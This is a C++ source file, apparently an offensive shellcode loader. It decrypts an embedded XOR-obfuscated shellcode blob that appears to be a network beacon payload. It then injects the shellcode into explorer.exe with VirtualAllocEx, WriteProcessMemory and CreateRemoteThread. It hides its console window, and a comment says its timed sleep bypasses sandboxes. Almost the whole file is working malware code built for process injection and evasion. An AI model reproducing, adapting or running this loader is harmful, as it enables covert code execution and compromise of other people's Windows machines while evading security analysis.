// Shellcode-test.cpp : coded by pcz
//
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

//xor的密钥
#define KEY 0x99
//经过xor加密的shellcode
unsigned char buf[] = "\x65\xd1\x1a\x7d\x69\x71\x51\x99\x99\x99\xd8\xc8\xd8\xc9\xcb\xc8\xcf\xd1\xa8\x4b\xfc\xd1\x12\xcb\xf9\xd1\x12\xcb\x81\xd1\x12\xcb\xb9\xd1\x12\xeb\xc9\xd1\x96\x2e\xd3\xd3\xd4\xa8\x50\xd1\xa8\x59\x35\xa5\xf8\xe5\x9b\xb5\xb9\xd8\x58\x50\x94\xd8\x98\x58\x7b\x74\xcb\xd8\xc8\xd1\x12\xcb\xb9\x12\xdb\xa5\xd1\x98\x49\xff\x18\xe1\x81\x92\x9b\xec\xeb\x12\x19\x11\x99\x99\x99\xd1\x1c\x59\xed\xfe\xd1\x98\x49\xc9\x12\xd1\x81\xdd\x12\xd9\xb9\xd0\x98\x49\x7a\xcf\xd1\x66\x50\xd8\x12\xad\x11\xd1\x98\x4f\xd4\xa8\x50\xd1\xa8\x59\x35\xd8\x58\x50\x94\xd8\x98\x58\xa1\x79\xec\x68\xd5\x9a\xd5\xbd\x91\xdc\xa0\x48\xec\x41\xc1\xdd\x12\xd9\xbd\xd0\x98\x49\xff\xd8\x12\x95\xd1\xdd\x12\xd9\x85\xd0\x98\x49\xd8\x12\x9d\x11\xd1\x98\x49\xd8\xc1\xd8\xc1\xc7\xc0\xc3\xd8\xc1\xd8\xc0\xd8\xc3\xd1\x1a\x75\xb9\xd8\xcb\x66\x79\xc1\xd8\xc0\xc3\xd1\x12\x8b\x70\xd6\x66\x66\x66\xc4\xf3\x99\xd0\x27\xee\xf0\xf7\xf0\xf7\xfc\xed\x99\xd8\xcf\xd0\x10\x7f\xd5\x10\x68\xd8\x23\xd5\xee\xbf\x9e\x66\x4c\xd1\xa8\x50\xd1\xa8\x4b\xd4\xa8\x59\xd4\xa8\x50\xd8\xc9\xd8\xc9\xd8\x23\xa3\xcf\xe0\x3e\x66\x4c\x70\xa\x99\x99\x99\xc3\xd1\x10\x58\xd8\x21\x22\x98\x99\x99\xd4\xa8\x50\xd8\xc8\xd8\xc8\xf3\x9a\xd8\xc8\xd8\x23\xce\x10\x6\x5f\x66\x4c\x72\xe0\xc2\xd1\x10\x58\xd1\xa8\x4b\xd0\x10\x41\xd4\xa8\x50\xcb\xf1\x99\xab\x59\x1d\xcb\xcb\xd8\x23\x72\xcc\xb7\xa2\x66\x4c\xd1\x10\x5f\xd1\x1a\x5a\xc9\xf3\x93\xc6\xd1\x10\x68\x23\x86\x99\x99\x99\xf3\x99\xf1\x19\xaa\x99\x99\xd0\x10\x79\xd8\x20\x9d\x99\x99\x99\xd8\x23\xec\xdf\x7\x1f\x66\x4c\xd1\x10\x68\xd1\x10\x43\xd0\x5e\x59\x66\x66\x66\x66\xd4\xa8\x50\xcb\xcb\xd8\x23\xb4\x9f\x81\xe2\x66\x4c\x1c\x59\x96\x1c\x4\x98\x99\x99\xd1\x66\x56\x96\x1d\x15\x98\x99\x99\x72\x2a\x70\x7d\x98\x99\x99\x71\x1b\x66\x66\x66\xb6\xec\xc8\xcf\xd8\x99\x91\x75\x2a\x43\x9b\x4e\x49\x7d\x2c\x94\x94\x4e\xd8\x2b\x7d\x7a\x7\xec\x90\x58\xf6\xac\x5a\xf9\x25\x57\x3d\x9d\xf0\x8e\x4b\x87\x9b\xc0\x78\x90\x64\x9b\xb5\x37\x7f\x45\x94\x96\x42\x1\x1f\x4c\xa1\xfc\xe1\x40\x3a\xbd\xbc\xb8\x11\x59\xe6\xf0\xea\xa7\x24\x8\xb8\x1e\x2d\xbf\x1d\x5e\xc3\xab\x2a\x99\xcc\xea\xfc\xeb\xb4\xd8\xfe\xfc\xf7\xed\xa3\xb9\xd4\xf6\xe3\xf0\xf5\xf5\xf8\xb6\xac\xb7\xa9\xb9\xb1\xfa\xf6\xf4\xe9\xf8\xed\xf0\xfb\xf5\xfc\xa2\xb9\xd4\xca\xd0\xdc\xb9\xae\xb7\xa9\xa2\xb9\xce\xf0\xf7\xfd\xf6\xee\xea\xb9\xd7\xcd\xb9\xac\xb7\xa8\xa2\xb9\xcd\xeb\xf0\xfd\xfc\xf7\xed\xb6\xac\xb7\xa9\xb0\x94\x93\x99\xdd\x79\xfe\x1\x42\x50\x85\xa1\xe0\x5a\xd7\x28\xd5\x6f\xd6\x8b\xd8\x22\x94\x23\x78\x91\x1a\x8b\x77\x27\xda\x5a\x1d\x95\x6\xcd\x45\x5a\xa3\x64\xb8\x4\xb2\x9a\x63\x9b\x56\x5c\x3d\x87\xcf\xc6\xc8\xe0\x60\x6b\x3\x4c\xff\xda\x9a\xb6\x13\xe4\x36\x3b\x77\x3f\xfa\x4b\xb4\x7\x88\x9\x7c\xff\xd6\xf7\x91\x8d\x7e\xa5\x38\x34\x25\xa2\x23\x98\x1c\x3d\xc0\xf\x78\xdd\xf5\x23\x74\x44\xe6\x18\xf6\x36\x65\x44\x31\x4f\x21\xff\xf7\x3c\xcb\x93\x6a\x90\xe6\xc\x58\x22\xca\xfb\x8a\xa3\x9\xb\xa4\x6e\x7a\xe9\x6f\x21\x77\x4d\xfa\x2f\x44\x2f\xdb\x91\x74\xd6\xc\x67\x7c\xa\x9\x79\xe7\xb7\x6c\x3f\x9\x25\x64\x19\x89\x2d\xa0\xb0\x5a\x51\xe3\x76\x85\x1\xca\x19\x45\x46\x46\xb5\x26\x4\x4c\x1f\x8e\xad\x33\xc4\x69\x84\x84\x7a\xf5\x7f\x54\xd2\x3e\xca\xb6\x9e\x97\xe6\x4e\x9f\x3f\xab\xf9\xd8\xc6\xe4\x60\x12\xcf\x85\x3d\xb0\xc9\xe3\x89\x8d\xf3\x84\x14\xc6\x5a\x8e\xf7\x14\x67\x5c\x1\x4b\x7\x59\xed\x98\x11\xe0\xa6\x99\xd8\x27\x69\x2c\x3b\xcf\x66\x4c\xd1\xa8\x50\x23\x99\x99\xd9\x99\xd8\x21\x99\x89\x99\x99\xd8\x20\xd9\x99\x99\x99\xd8\x23\xc1\x3d\xca\x7c\x66\x4c\xd1\xa\xca\xca\xd1\x10\x7e\xd1\x10\x68\xd1\x10\x43\xd8\x21\x99\xb9\x99\x99\xd0\x10\x60\xd8\x23\x8b\xf\x10\x7b\x66\x4c\xd1\x1a\x5d\xb9\x1c\x59\xed\x2f\xff\x12\x9e\xd1\x98\x5a\x1c\x59\xec\x4e\xc1\xc1\xc1\xd1\x9c\x99\x99\x99\x99\xc9\x5a\x71\xe6\x64\x66\x66\xa8\xa9\xa8\xb7\xad\xaa\xb7\xa8\xaf\xa9\xb7\xa8\xaa\xa9\x99\xd0\xf\x9b\x4b";
typedef void(*PFN_F00);

#include <stdio.h>
#include <Windows.h>


int main()
{
    //解密xor 
    //src : https://github.com/shanfenglan/xor_shellcode

    unsigned char buff[sizeof(buf)];
    for (int i = 0; i < sizeof(buf) - 1; i++)
    {
        buff[i] = buf[i] ^ KEY;
    }

    //获取进程
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    //取进程pid
    BOOL bret = Process32First(hSnap, &pe32);
    while (bret) {
        bret = Process32Next(hSnap, &pe32);
        if (wcscmp(pe32.szExeFile, L"explorer.exe") == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hprocess == INVALID_HANDLE_VALUE) {
        //printf("hprocess err");
        //这里是无限时间的睡眠
        Sleep(-1);
    }

    //申请空间
    LPVOID lpaddr = VirtualAllocEx(hprocess, NULL, sizeof(buff) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (lpaddr == NULL) {
        //printf("lpaddr Err");
        //这里是无限时间的睡眠
        Sleep(-1);
    }

    //可以有效的bypass一些沙箱
    Sleep(2000);

    //写入数据
    WriteProcessMemory(hprocess, lpaddr, (LPVOID)buff, sizeof(buff) + 1, NULL);

    //创建远线程
    LPVOID handle = CreateRemoteThread(hprocess, 0, 0, (LPTHREAD_START_ROUTINE)lpaddr, NULL, 0, NULL);

    if (NULL == handle)
    {
        //printf("handle Err");
        //这里是无限时间的睡眠
        Sleep(-1);
    }

    //等待线程结束
    WaitForSingleObject(handle, -1);


    return 0;
}